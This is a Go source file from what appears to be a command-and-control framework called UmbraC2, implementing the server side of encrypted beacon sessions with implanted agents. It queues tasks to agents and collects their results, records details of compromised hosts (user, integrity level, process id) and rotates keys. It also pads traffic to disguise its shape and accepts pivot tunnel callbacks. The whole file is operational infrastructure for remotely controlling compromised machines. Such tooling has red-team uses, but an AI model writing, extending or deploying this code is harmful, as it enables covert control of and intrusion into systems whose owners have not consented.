package link

import (
	"errors"
	"fmt"
	"log/slog"
	"net"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// AgentLink drives one authenticated agent session. The same type is used by
// the TCP and the HTTP transport: a transport supplies frames, this type
// decides what they mean.
type AgentLink struct {
	Hub       *hub.Hub
	Session   *session.Session
	AgentID   string
	Transport string
	Log       *slog.Logger

	closed bool
}

// MaxTasksPerCycle bounds how much work one beacon response can carry.
const MaxTasksPerCycle = 64

// HandleFrame processes one inbound frame and returns the frames to send back.
// A nil return value means "nothing to say right now".
func (l *AgentLink) HandleFrame(raw []byte) ([][]byte, error) {
	msgType, msg, err := l.Session.OpenMessage(raw)
	if err != nil {
		return nil, fmt.Errorf("agent %s: open frame: %w", l.AgentID, err)
	}
	if l.Log != nil {
		l.Log.Debug("agent frame", "agent", l.AgentID, "type", wire.TypeName(msgType))
	}

	switch msgType {
	case wire.MsgCheckin:
		return l.onCheckin(msg)
	case wire.MsgResult:
		return l.onResult(msg)
	case wire.MsgPing:
		frame, err := l.Session.Encrypt(wire.MsgPong, upk.Map{"ts": msg["ts"]})
		if err != nil {
			return nil, err
		}
		return [][]byte{frame}, nil
	case wire.MsgBye:
		l.closed = true
		return nil, nil
	case wire.MsgError:
		return l.onError(msg)
	case wire.MsgPadding:
		// Padding frames carry random bytes and are ignored: they only make
		// the traffic shape uniform.
		return nil, nil
	case wire.MsgRekey:
		seed, _ := msg["seed"].([]byte)
		if len(seed) != 32 {
			return nil, errors.New("agent requested rekey without a 32-byte seed")
		}
		if err := l.Session.ApplyRekey(seed); err != nil {
			return nil, err
		}
		return nil, nil
	default:
		if l.Log != nil {
			l.Log.Warn("unexpected message from agent", "agent", l.AgentID, "type", wire.TypeName(msgType))
		}
		return nil, nil
	}
}

// Closed reports whether the agent asked to end the session.
func (l *AgentLink) Closed() bool { return l.closed }

func (l *AgentLink) onCheckin(msg map[string]any) ([][]byte, error) {
	tasks := l.Hub.NextTasks(l.AgentID, MaxTasksPerCycle)
	sleep, jitter := l.Hub.Policy(l.AgentID)

	encoded := make([]any, 0, len(tasks))
	for _, t := range tasks {
		args := upk.Map{}
		for k, v := range t.Args {
			args[k] = v
		}
		encoded = append(encoded, upk.Map{"id": t.ID, "kind": t.Kind, "args": args})
	}
	body := upk.Map{
		"tasks":       encoded,
		"sleep":       sleep,
		"jitter":      jitter,
		"server_time": time.Now().Unix(),
	}
	if n, ok := number(msg["n"]); ok {
		body["pending"] = n
	}
	// Rotate keys proactively once a session has carried enough traffic.
	//
	// Ordering matters and is easy to get wrong: the REKEY frame must be sealed
	// with the OLD key set (the peer can only open it while still on the old
	// keys) and it must be written BEFORE any frame sealed with the new key.
	// Frames must also leave in nonce order, so we seal REKEY first, rotate,
	// then seal TASK_BATCH with the fresh key set. The peer sees REKEY at the
	// old counter, applies it (both counters reset to 0) and then opens
	// TASK_BATCH as its first new-key frame. No length guessing needed: the
	// agent reads frames until it gets TASK_BATCH.
	out := make([][]byte, 0, 2)
	if l.Session.NeedsRekey() {
		if seed, err := crypt.RandomBytes(32); err == nil {
			if frame, err := l.Session.Encrypt(wire.MsgRekey, upk.Map{"seed": seed}); err == nil {
				if err := l.Session.ApplyRekey(seed); err == nil {
					out = append(out, frame)
					if l.Log != nil {
						l.Log.Debug("rotating session keys", "agent", l.AgentID)
					}
				}
			}
		}
	}

	// Cancel frames ride the same control path as REKEY: they must be sealed
	// before the batch they refer to, with whatever keys are current now.
	//
	// This is taken *after* NextTasks() marked the tasks delivered, which is
	// deliberate: a cancel that arrives in that window refers to a task sitting
	// in the batch we are about to send, and the beacon needs the id to skip it.
	for _, taskID := range l.Hub.TakeCancels(l.AgentID) {
		frame, err := l.Session.Encrypt(wire.MsgTaskCancel, upk.Map{"id": taskID})
		if err != nil {
			return nil, err
		}
		out = append(out, frame)
		if l.Log != nil {
			l.Log.Debug("queued task cancel", "agent", l.AgentID, "task", taskID)
		}
	}

	frame, err := l.Session.Encrypt(wire.MsgTaskBatch, body)
	if err != nil {
		return nil, err
	}
	return append(out, frame), nil
}

// onError surfaces an agent-reported failure (frame-level problem, refused
// task, broken transport) to operators instead of dropping it. It is
// informational: the session stays up so the beacon can retry.
func (l *AgentLink) onError(msg map[string]any) ([][]byte, error) {
	code := int64(0)
	if c, ok := asInt64(msg["code"]); ok {
		code = c
	}
	text, _ := msg["msg"].(string)
	if len(text) > 512 {
		text = text[:512]
	}
	l.Hub.Emit(hub.Event{Kind: "beacon.error", AgentID: l.AgentID,
		Data: map[string]any{"code": code, "msg": text}})
	if l.Log != nil {
		l.Log.Warn("agent reported an error", "agent", l.AgentID, "code", code, "msg", text)
	}
	return nil, nil
}

func (l *AgentLink) onResult(msg map[string]any) ([][]byte, error) {
	taskID, _ := msg["id"].(string)
	if taskID == "" {
		return nil, errors.New("result without task id")
	}
	code := int64(0)
	if c, ok := asInt64(msg["code"]); ok {
		code = c
	}
	output, _ := msg["out"].([]byte)
	errMsg, _ := msg["err"].(string)
	l.Hub.CompleteTask(l.AgentID, taskID, code, output, errMsg, resultMeta(msg))
	return nil, nil
}

// resultMeta picks the extra fields a beacon attached to a RESULT body (offset,
// total, eof, sha256, ...) and keeps only JSON-safe scalars, so a hostile or
// buggy beacon cannot stuff nested data into the state file.
func resultMeta(msg map[string]any) map[string]any {
	if len(msg) <= 4 {
		return nil
	}
	meta := make(map[string]any, len(msg)-4)
	for k, v := range msg {
		switch k {
		case "id", "code", "out", "err":
			continue
		}
		switch v.(type) {
		case string, bool, int64, uint64, float64:
			meta[k] = v
		}
	}
	if len(meta) == 0 {
		return nil
	}
	return meta
}

// AgentMeta converts HELLO metadata into a store record.
func AgentMeta(info *HelloInfo, transport, addr string, sleep, jitter int) *store.Agent {
	meta := info.Meta
	str := func(key string) string {
		if v, ok := meta[key].(string); ok {
			return v
		}
		return ""
	}
	pid, _ := asInt64(meta["pid"])
	rec := &store.Agent{
		ID:        info.ID,
		Host:      str("host"),
		OS:        str("os"),
		Arch:      str("arch"),
		User:      str("user"),
		Integrity: str("integ"),
		Version:   str("ver"),
		PID:       pid,
		Transport: transport,
		Addr:      addr,
		Sleep:     sleep,
		Jitter:    jitter,
	}
	if rec.Host == "" {
		rec.Host = str("hostname")
	}
	if rec.Version == "" {
		rec.Version = "unknown"
	}
	return rec
}

// serveAgentTCP runs a full TCP beacon session: handshake, then frames until
// the agent says BYE, goes silent, or the connection breaks.
func (s *Server) serveAgentTCP(conn net.Conn) {
	defer conn.Close()
	addr := conn.RemoteAddr().String()
	log := s.Log.With("peer", addr, "transport", "tcp")

	if !s.guard.Allow(addr) {
		log.Warn("connection refused by guard")
		return
	}
	if err := conn.SetDeadline(time.Now().Add(s.Cfg.HandshakeTimeout())); err != nil {
		return
	}
	stream := NewConnStream(conn)
	sess, info, err := Handshake(stream, s.Cfg, log, addr)
	if err != nil {
		s.guard.Fail(addr)
		log.Warn("handshake failed", "err", err)
		return
	}
	if info.Role != crypt.RoleAgent {
		log.Warn("operator key used on the agent listener", "id", info.ID)
		return
	}
	s.guard.Succeed(addr)
	s.runAgent(stream, conn, sess, info, addr, "tcp", log)
}

// runAgent carries the beacon session of an agent that already completed the
// handshake.
//
// The handshake is not part of this function on purpose: the TLS listener
// hands the connection over after it decided that the peer is an agent, and
// the plain TCP listener does the same after the HELLO was read.
func (s *Server) runAgent(stream FrameStream, conn net.Conn, sess *session.Session, info *HelloInfo, addr, transport string, log *slog.Logger) {
	// A pivot callback: the agent was asked to open a tunnel session and
	// dialled back. It must not be registered as a live beacon -- it is a
	// separate connection that only carries tunnel frames.
	if sid, ok := tunnelSessionID(info.Meta); ok {
		if s.Pivot == nil {
			log.Warn("tunnel callback refused: pivoting is not enabled", "agent", info.ID)
			return
		}
		done, err := s.Pivot.Attach(info.ID, sid, stream, sess)
		if err != nil {
			log.Warn("tunnel callback refused", "agent", info.ID, "err", err)
			return
		}
		<-done
		log.Info("tunnel session ended", "agent", info.ID)
		return
	}

	sleep, jitter := s.Cfg.Server.Beacon.Sleep, s.Cfg.Server.Beacon.Jitter
	meta := AgentMeta(info, transport, addr, sleep, jitter)
	rec, _, err := s.Hub.RegisterAgent(meta, transport, addr, info.Suite, info.SessionID)
	if err != nil {
		log.Warn("agent registration refused", "err", err)
		return
	}
	// Scoped to this session: a reconnect may already have replaced the live
	// entry, and this goroutine must not delete its successor's record.
	defer s.Hub.UnregisterSession(rec.ID, fmt.Sprintf("%x", info.SessionID))

	link := &AgentLink{Hub: s.Hub, Session: sess, AgentID: rec.ID, Transport: transport, Log: s.Log}
	budget := int64(s.Cfg.Server.Limits.MaxFrameBytesPerConn)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(s.Cfg.IdleTimeout()))
		raw, err := stream.ReadFrame()
		if err != nil {
			if !isBenignNetErr(err) {
				log.Debug("agent read ended", "err", err)
			}
			return
		}
		budget -= int64(len(raw))
		if budget < 0 {
			log.Warn("agent exceeded frame budget", "agent", rec.ID)
			return
		}
		out, err := link.HandleFrame(raw)
		if err != nil {
			log.Warn("agent frame rejected", "agent", rec.ID, "err", err)
			return
		}
		for _, f := range out {
			if err := stream.WriteFrame(f); err != nil {
				log.Debug("agent write failed", "err", err)
				return
			}
		}
		if link.Closed() {
			log.Info("agent closed session", "agent", rec.ID)
			return
		}
	}
}

func isBenignNetErr(err error) bool {
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return true
	}
	return false
}

// tunnelSessionID extracts the pivot session id an agent announced in its
// HELLO metadata. The id is what pairs the callback with the `tunnel` task
// the server queued, so it is checked for shape before it is used.
func tunnelSessionID(meta map[string]any) (string, bool) {
	raw, _ := meta["tunnel"].(string)
	if raw == "" || len(raw) > 64 {
		return "", false
	}
	for _, r := range raw {
		switch {
		case r >= '0' && r <= '9':
		case r >= 'a' && r <= 'f':
		case r >= 'A' && r <= 'F':
		case r == '-':
		default:
			return "", false
		}
	}
	return raw, true
}
